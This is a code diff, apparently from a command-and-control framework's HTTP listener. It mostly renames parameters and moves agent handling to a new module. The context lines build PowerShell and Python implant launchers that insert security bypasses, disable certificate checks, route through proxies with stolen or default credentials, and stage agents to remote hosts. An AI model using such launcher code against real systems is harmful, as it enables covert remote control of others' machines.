@@ -119,11 +119,6 @@ class Listener:
                 "Required": False,
                 "Value": "default",
             },
-            "SlackURL": {
-                "Description": "Your Slack Incoming Webhook URL to communicate with your Slack instance.",
-                "Required": False,
-                "Value": "",
-            },
             "Cookie": {
                 "Description": "Custom Cookie Name",
                 "Required": False,
@@ -259,13 +254,13 @@ class Listener:
         encode=True,
         obfuscate=False,
         obfuscation_command="",
-        userAgent="default",
+        user_agent="default",
         proxy="default",
-        proxyCreds="default",
-        stagerRetries="0",
+        proxy_creds="default",
+        stager_retries="0",
         language=None,
-        safeChecks="",
-        listenerName=None,
+        safe_checks="",
+        listener_name=None,
         stager=None,
         bypasses: list[str] | None = None,
     ):
@@ -292,25 +287,25 @@ class Listener:
         profile.stager.client.port = port
         profile.stager.client.path = profile.stager.client.random_uri()
 
-        if userAgent and userAgent.lower() != "default":
+        if user_agent and user_agent.lower() != "default":
             if (
-                userAgent.lower() == "none"
+                user_agent.lower() == "none"
                 and "User-Agent" in profile.stager.client.headers
             ):
                 profile.stager.client.headers.pop("User-Agent")
             else:
-                profile.stager.client.headers["User-Agent"] = userAgent
+                profile.stager.client.headers["User-Agent"] = user_agent
 
         if language == "powershell":
             launcherBase = '$ErrorActionPreference = "SilentlyContinue";'
 
-            if safeChecks.lower() == "true":
+            if safe_checks.lower() == "true":
                 launcherBase = "If($PSVersionTable.PSVersion.Major -ge 3){"
 
             for bypass in bypasses:
                 launcherBase += bypass
 
-            if safeChecks.lower() == "true":
+            if safe_checks.lower() == "true":
                 launcherBase += (
                     "};[System.Net.ServicePointManager]::Expect100Continue=0;"
                 )
@@ -370,13 +365,13 @@ class Listener:
                     )
                     launcherBase += "$wc.Proxy = $proxy;"
 
-                if proxyCreds and proxyCreds.lower() != "none":
-                    if proxyCreds.lower() == "default":
+                if proxy_creds and proxy_creds.lower() != "none":
+                    if proxy_creds.lower() == "default":
                         launcherBase += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
 
                     else:
-                        username = proxyCreds.split(":")[0]
-                        password = proxyCreds.split(":")[1]
+                        username = proxy_creds.split(":")[0]
+                        password = proxy_creds.split(":")[1]
                         if len(username.split("\\")) > 1:
                             usr = username.split("\\")[1]
                             domain = username.split("\\")[0]
@@ -459,7 +454,7 @@ class Listener:
                 launcherBase += "if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context\n"
 
             # ==== SAFE CHECKS ====
-            if safeChecks and safeChecks.lower() == "true":
+            if safe_checks and safe_checks.lower() == "true":
                 launcherBase += listener_util.python_safe_checks()
 
             launcherBase += f"server='{host}'\n"
@@ -477,13 +472,13 @@ class Listener:
                         + proxy
                         + "'})\n"
                     )
-                if proxyCreds and proxyCreds != "none":
-                    if proxyCreds == "default":
+                if proxy_creds and proxy_creds != "none":
+                    if proxy_creds == "default":
                         launcherBase += "o = urllib.request.build_opener(proxy)\n"
                     else:
                         launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()\n"
-                        username = proxyCreds.split(":")[0]
-                        password = proxyCreds.split(":")[1]
+                        username = proxy_creds.split(":")[0]
+                        password = proxy_creds.split(":")[1]
                         launcherBase += (
                             "proxy_auth_handler.add_password(None,'"
                             + proxy
@@ -1398,7 +1393,7 @@ def send_staging_for_child(self, received_data, hop_name):
                 else:
                     agentInfo = implementation.extract_client(malleableRequest)
                 if agentInfo:
-                    dataResults = self.mainMenu.agents.handle_agent_data(
+                    dataResults = self.mainMenu.agentcommsv2.handle_agent_data(
                         stagingKey, agentInfo, listenerOptions, clientIP
                     )
                     if not dataResults or len(dataResults) <= 0:
@@ -1462,9 +1457,9 @@ def send_staging_for_child(self, received_data, hop_name):
                                 sessionID = (
                                     results.split(b" ")[1].strip().decode("UTF-8")
                                 )
-                                sessionKey = self.mainMenu.agents.agents[sessionID][
-                                    "sessionKey"
-                                ]
+                                sessionKey = self.mainMenu.agentcommsv2.agents[
+                                    sessionID
+                                ]["sessionKey"]
 
                                 # log event
                                 message = f"{listenerName}: Sending agent (stage 2) to {sessionID} at {clientIP}"
